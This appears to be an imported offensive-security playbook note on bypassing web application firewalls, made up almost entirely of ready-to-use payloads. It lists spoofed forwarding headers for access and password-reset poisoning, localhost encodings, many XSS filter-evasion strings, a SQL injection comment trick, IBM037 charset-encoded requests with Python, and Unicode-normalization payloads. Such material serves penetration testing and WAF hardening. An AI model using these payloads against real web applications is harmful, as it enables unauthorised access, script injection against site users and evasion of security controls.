---
technique: "WAF Bypasses"
family: "misc"
severity_hint: "medium"
tags: ["403", "HTTP"]
source: "_raw/Web attacks/Web Attacks/WAF Bypasses.md"
source_sha256: "988184cf25846a9f834db4bbedd0d52528c1340d45245ed289afaf7373d20fee"
curator_version: 2
review_status: imported-unreviewed
---

# WAF Bypasses

> Family: **misc** · Severity hint: **medium** · Tags: 403, HTTP
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `cpp: X-Forwarded-Host`
- `html: <sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag`
- `cpp: # Charset encoding`
- `cpp: # IIS, ASP Clasic`
- `cpp: # under the NFKD normalization algorithm, the characters on the left translate`

## Playbook (operator notes)

# WAF Bypasses

# WAF Bypass using override Headers

- Can also be used for Password reset poisoning

```cpp
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Scheme 
Origin: 127.0.0.1
nullOrigin: 127.0.0.1
X-Frame-Options: Allow
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
Proxy-Host: 127.0.0.1
Request-Uri: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Base-Url: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Url: 127.0.0.1
Redirect: 127.0.0.1
Real-Ip: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization:127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
```

# Obfuscation

- Decimal encoding: `2130706433`
- Hex encoding: `0x7f000001`
- Octal encoding: `0177.0000.0000.0001`
- Zero: `0`
- Short form: `127.1`
- IPv6: `::1`
- IPv4 address in IPv6 format: `[0:0:0:0:0:ffff:127.0.0.1]` or `[::ffff:127.0.0.1]`
- External domain that resolves to localhost: `localtest.me`

# Regex Bypasses

```html
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks 
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```

# Charset Encoding

```cpp
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

# Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037"))) 

# Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```

# Obfuscation

```cpp
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```

# Unicode Compatability

[Find all Unicode Characters from Hieroglyphs to Dingbats – Unicode Compart](https://www.compart.com/en/unicode/U+003C)

[Jorge Lajara Website](https://jlajara.gitlab.io/Bypass_WAF_Unicode)

```cpp
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```

# IP Based blocks

https://github.com/rootcathacking/catspin

---

[WAF Bypass Using Headers](https://kathan19.gitbook.io/howtohunt/waf-bypasses/waf_bypass_using_headers)

## Source
Original note: `_raw/Web attacks/Web Attacks/WAF Bypasses.md`
